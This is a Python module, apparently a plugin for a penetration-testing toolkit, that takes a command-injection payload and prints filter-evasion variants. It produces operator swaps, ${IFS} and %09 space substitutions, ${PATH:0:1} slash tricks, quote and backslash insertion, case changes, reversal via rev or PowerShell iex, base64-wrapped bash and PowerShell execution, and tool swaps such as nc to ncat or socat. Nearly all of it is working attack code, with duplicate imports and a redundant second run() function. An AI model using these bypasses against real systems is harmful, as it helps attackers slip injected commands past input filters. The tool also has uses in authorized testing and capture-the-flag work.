PROVIDES = []
REQUIRES = []

G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
M = "\033[95m"
W = "\033[0m"
BOLD = "\033[1m"


# ==========================================================
# Header
# ==========================================================

def print_header(payload):

    print(
        f"\n{B}┌── {BOLD}COMMAND BYPASS{W}{B} ──────────────────────────┐{W}"
    )

    print(
        f"{B}│{W} Payload: {C}{payload}{W}"
    )

    print(
        f"{B}└────────────────────────────────────────────┘{W}\n"
    )

# ==========================================================
# Input
# ==========================================================

def get_payload(args):

    if getattr(args, "extra", None):
        return " ".join(args.extra)

    return input(f"{Y}Payload>{W} ").strip()


# ==========================================================
# Detection
# ==========================================================

def detect_operators(payload):

    operators = []

    remaining = payload

    checks = [
        "&&",
        "||",
        ";",
        "|",
        "&",
        "%0a",
        "\n",
    ]

    for op in checks:

        if op in remaining:

            operators.append(op)

            remaining = remaining.replace(op, "", 1)

    return operators


def detect_spaces(payload):

    return " " in payload

def detect_slashes(payload):

    slashes = []

    if "/" in payload:
        slashes.append("/")

    if "\\" in payload:
        slashes.append("\\")

    return slashes


import re

import re


def detect_commands(payload):

    commands = []

    #
    # Split into individual commands
    #

    parts = re.split(
        r"\s*(?:&&|\|\||;|\||\n|%0a)\s*",
        payload,
    )

    wrappers = {
        "sudo",
        "env",
        "nohup",
        "time",
    }

    for part in parts:

        part = part.strip()

        if not part:
            continue

        tokens = part.split()

        #
        # Skip wrappers
        #

        while tokens and tokens[0] in wrappers:
            tokens.pop(0)

        if not tokens:
            continue

        command = tokens[0].strip("'\"")

        if command not in commands:
            commands.append(command)

    return commands

def detect_quotes(payload):

    return "'" in payload or '"' in payload




# ==========================================================
# Bypass Generators
# ==========================================================

def operator_bypasses(payload, operators):

    if not operators:
        return

    print_section("Operator Bypasses")

    replacements = {
    ";": ["%0a"],
    "&&": [";"],
    "||": [";"],
    "|": ["%0a"],
    "&": ["%0a"],
}

    seen = set()

    for operator in operators:

        for replacement in replacements.get(operator, []):

            bypass = payload.replace(
                operator,
                replacement,
                1
            )

            if bypass in seen:
                continue

            seen.add(bypass)

            print_payload(
                f"{operator} → {replacement}",
                bypass
            )

    print()

def space_bypasses(payload):

    if " " not in payload:
        return

    print_section("Space Bypasses")

    replacements = [
        "${IFS}",
        "%09",
    ]

    seen = set()

    for replacement in replacements:

        bypass = payload.replace(
            " ",
            replacement
        )

        if bypass in seen:
            continue

        seen.add(bypass)

        print_payload(
            f"space → {replacement}",
            bypass
        )

    print()

def slash_bypasses(payload):

    print_section("Slash Bypasses")

    seen = set()

    replacements = {
        "/": [
            "${PATH:0:1}",
            "${HOME:0:1}",
            "${LS_COLORS:10:1}",
        ],
        "\\": [
            "%HOMEPATH:~6,-11%",
            "$env:HOMEPATH[0]",
        ],
    }

    for slash, values in replacements.items():

        if slash not in payload:
            continue

        for replacement in values:

            bypass = payload.replace(
                slash,
                replacement
            )

            if bypass in seen:
                continue

            seen.add(bypass)

            print_payload(
                f"{slash} → {replacement}",
                bypass
            )

    print()


def command_obfuscation(payload):

    commands = detect_commands(payload)

    if not commands:
        return

    print_section("Command Obfuscation")

    seen = set()

    for command in commands:

        bypasses = []

        #
        # Single quotes
        #

        bypasses.append(
            "'".join(command)
        )

        #
        # Double quotes
        #

        bypasses.append(
            '"'.join(command)
        )

        #
        # Backslashes
        #

        bypasses.append(
            "\\".join(command)
        )

        for obfuscated in bypasses:

            new_payload = payload.replace(
                command,
                obfuscated,
                1
            )

            if new_payload in seen:
                continue

            seen.add(new_payload)

            print_payload(
                f"{command} → {obfuscated}",
                new_payload
            )

    print()

def case_bypasses(payload):

    commands = detect_commands(payload)

    if not commands:
        return

    print_section("Case Bypasses")

    seen = set()

    for command in commands:

        bypasses = [
            command.upper(),
            command.lower(),
            command.capitalize(),
            command.swapcase(),
        ]

        for bypass in bypasses:

            if bypass == command:
                continue

            new_payload = payload.replace(
                command,
                bypass,
                1
            )

            if new_payload in seen:
                continue

            seen.add(new_payload)

            print_payload(
                f"{command} → {bypass}",
                new_payload
            )

    print()


def reverse_bypasses(payload):

    commands = detect_commands(payload)

    if not commands:
        return

    print_section("Reverse Bypasses")

    seen = set()

    for command in commands:

        reversed_command = command[::-1]

        bypasses = [
            (
                "Linux",
                f"$(rev<<<'{reversed_command}')",
            ),
            (
                "PowerShell",
                f"iex \"$('{reversed_command}'[-1..-20] -join '')\"",
            ),
        ]

        for title, bypass in bypasses:

            new_payload = payload.replace(
                command,
                bypass,
                1
            )

            if new_payload in seen:
                continue

            seen.add(new_payload)

            print_payload(
                f"{command} → {title}",
                new_payload
            )

    print()


import base64
import urllib.parse


import base64


def encoding_bypasses(payload):

    print_section("Encoding Bypasses")

    seen = set()

    #
    # Linux
    #

    b64 = base64.b64encode(
        payload.encode()
    ).decode()

    linux = f"bash<<<$(base64 -d<<<{b64})"

    #
    # Windows (PowerShell)
    #

    b64_utf16 = base64.b64encode(
        payload.encode("utf-16le")
    ).decode()

    powershell = (
        'iex "$([System.Text.Encoding]::Unicode.GetString('
        f"[System.Convert]::FromBase64String('{b64_utf16}')))"
    )

    bypasses = [
        ("Linux Base64", linux),
        ("PowerShell Base64", powershell),
    ]

    for title, bypass in bypasses:

        if bypass in seen:
            continue

        seen.add(bypass)

        print_payload(title, bypass)

    print()



def command_alternatives(payload):

    print_section("Command Alternatives")

    alternatives = {
        "bash": [
            "sh",
        ],

        "base64 -d": [
            "openssl enc -base64 -d",
        ],

        "cat": [
            "more",
            "less",
            "head",
            "tail",
        ],

        "grep": [
            "egrep",
            "fgrep",
            "awk",
            "sed -n",
        ],

        "wget": [
            "curl -O",
        ],

        "curl": [
            "wget",
        ],

        "nc": [
            "ncat",
            "socat",
        ],

        "python": [
            "python3",
            "python2",
            "pypy3",
        ],

        "python3": [
            "python",
            "python2",
            "pypy3",
        ],

        "powershell": [
            "pwsh",
        ],

        "cmd.exe": [
            "cmd",
        ],
    }

    seen = set()

    for original, replacements in alternatives.items():

        if original not in payload:
            continue

        for replacement in replacements:

            bypass = payload.replace(
                original,
                replacement,
                1,
            )

            if bypass in seen:
                continue

            seen.add(bypass)

            print_payload(
                f"{original} → {replacement}",
                bypass,
            )

    print()


# ==========================================================
# Helpers
# ==========================================================

def print_section(title):

    print(
        f"{B}┌── {title} "
        f"{'─' * max(0, 45 - len(title))}{W}"
    )

    print()

def print_payload(title, payload):

    print(
        f"{B}[+]{W} {title}"
    )

    print(
        f"{Y}{payload}{W}\n"
    )

# ==========================================================
# Main
# ==========================================================

def run(data, cred, args):

    payload = get_payload(args)

    if not payload:
        return

    print_header(payload)

    #
    # Detection
    #

    operators = detect_operators(payload)


    if operators:

        print_section("Detected Operators")

        for op in operators:

            print(
                f"  {B}├──{W} {C}{repr(op)}{W}"
            )

        print()

    if detect_spaces(payload):

        print_section("Detected Spaces")

        print(
            f"  {B}├──{W} {C}Space characters detected{W}"
        )

        print()

    slashes = detect_slashes(payload)

    if slashes:

        print_section("Detected Slashes")

        for slash in slashes:

            print(
                f"  {B}├──{W} {C}{repr(slash)}{W}"
            )

        print()
        
    commands = detect_commands(payload)

    if commands:

        print_section("Detected Commands")

        for command in commands:

            print(
                f"  {B}├──{W} {C}{repr(command)}{W}"
            )

        print()



    if detect_quotes(payload):

        print_section("Detected Quotes")

        print(
            f"  {B}├──{W} {C}Quote characters detected{W}"
        )

        print()



def common_bypasses(payload):

    print_section("Common Bypasses")

    #
    # Common replacements
    #

    operator = {
        "&&": ";",
        "||": ";",
        "|": "%0a",
        "&": "%0a",
        ";": "%0a",
    }

    space = [
        "${IFS}",
        "%09",
    ]

    slash = [
        "${PATH:0:1}",
        "${HOME:0:1}",
    ]

    commands = {
        "bash": "sh",
        "cat": "more",
        "curl": "wget",
        "wget": "curl -O",
    }

    payloads = []

    #
    # Operator
    #

    current = payload

    for old, new in operator.items():

        if old in current:

            current = current.replace(old, new, 1)
            break

    #
    # Command alternatives
    #

    for old, new in commands.items():

        if old in current:

            current = current.replace(old, new, 1)

    #
    # Space + Slash combinations
    #

    for s in space:

        temp = current.replace(" ", s)

        for sl in slash:

            final = temp.replace("/", sl)

            if final not in payloads:

                payloads.append(final)

    #
    # Output
    #

    for i, bypass in enumerate(payloads, start=1):

        print_payload(
            f"Common #{i}",
            bypass,
        )

def run(data, cred, args):

    payload = get_payload(args)

    if not payload:
        return

    print_header(payload)

    #
    # Detection
    #

    operators = detect_operators(payload)
    slashes = detect_slashes(payload)
    commands = detect_commands(payload)

    #
    # Menu
    #

    print(f"{B}[1]{W} Operator")
    print(f"{B}[2]{W} Spaces")
    print(f"{B}[3]{W} Slashes")
    print(f"{B}[4]{W} Command Obfuscation")
    print(f"{B}[5]{W} Case")
    print(f"{B}[6]{W} Reverse")
    print(f"{B}[7]{W} Encoding")
    print(f"{B}[8]{W} Command Alternatives")
    print()

    print(f"{B}[9]{W} Common Bypasses")
    print()

    print(f"{B}[0]{W} All")
    print()

    choice = input("select> ").strip()

    match choice:

        case "1":
            operator_bypasses(payload, operators)

        case "2":
            space_bypasses(payload)

        case "3":
            slash_bypasses(payload)

        case "4":
            command_obfuscation(payload)

        case "5":
            case_bypasses(payload)

        case "6":
            reverse_bypasses(payload)

        case "7":
            encoding_bypasses(payload)

        case "8":
            command_alternatives(payload)

        case "9":
            common_bypasses(payload)

        case "0":

            #
            # Detection
            #

            if operators:

                print_section("Detected Operators")

                for op in operators:
                    print(f"  {B}├──{W} {C}{repr(op)}{W}")

                print()

            if detect_spaces(payload):

                print_section("Detected Spaces")

                print(f"  {B}├──{W} {C}Space characters detected{W}")

                print()

            if slashes:

                print_section("Detected Slashes")

                for slash in slashes:
                    print(f"  {B}├──{W} {C}{repr(slash)}{W}")

                print()

            if commands:

                print_section("Detected Commands")

                for command in commands:
                    print(f"  {B}├──{W} {C}{repr(command)}{W}")

                print()

            if detect_quotes(payload):

                print_section("Detected Quotes")

                print(f"  {B}├──{W} {C}Quote characters detected{W}")

                print()

            #
            # Suggestions
            #

            operator_bypasses(payload, operators)
            space_bypasses(payload)
            slash_bypasses(payload)
            command_obfuscation(payload)
            case_bypasses(payload)
            reverse_bypasses(payload)
            encoding_bypasses(payload)
            command_alternatives(payload)

        case _:
            return